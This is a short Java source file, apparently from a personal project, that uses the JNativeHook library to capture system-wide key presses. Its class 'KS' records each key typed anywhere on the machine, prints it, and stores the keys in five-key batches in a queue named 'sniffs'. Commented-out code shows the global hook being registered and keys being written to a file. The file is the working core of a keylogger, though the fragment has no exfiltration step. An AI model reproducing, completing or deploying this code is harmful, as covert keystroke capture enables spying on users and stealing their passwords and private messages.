import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.concurrent.ConcurrentLinkedQueue;

/**
 * Created by Matan on 3/22/16.
 */
public class KS implements ActionListener, NativeKeyListener {

    ConcurrentLinkedQueue<String> sniffs = new ConcurrentLinkedQueue<>();
    int typeCounter = 0;
    String currentBatch = "";

    @Override
    public void actionPerformed(ActionEvent actionEvent) {
    }

    public void handleKey(String typedKey) {
        if (!typedKey.equals("Undefined")) {
            //Writer w = new Writer();
            //w.WriteToFile(typedKey);

            currentBatch = currentBatch.concat(typedKey);

            if (typeCounter == 5) {
                sniffs.add(currentBatch);
                currentBatch = "";
                typeCounter = 0;
            }
        }
        typeCounter++;
    }


    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        String typedKey = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
        System.out.print("The key that was pressed: " + typedKey);
        handleKey(typedKey);
        }


    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }


    // public void keyReleased(NativeKeyEvent e){
     //   System.out.println("Key Released: "+NativeKeyEvent.getKeyText(e.getKeyCode()));
   // }

}


/*
public class GlobalKeyListenerExample implements NativeKeyListener  {



    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new GlobalKeyListenerExample());
    }
}
 */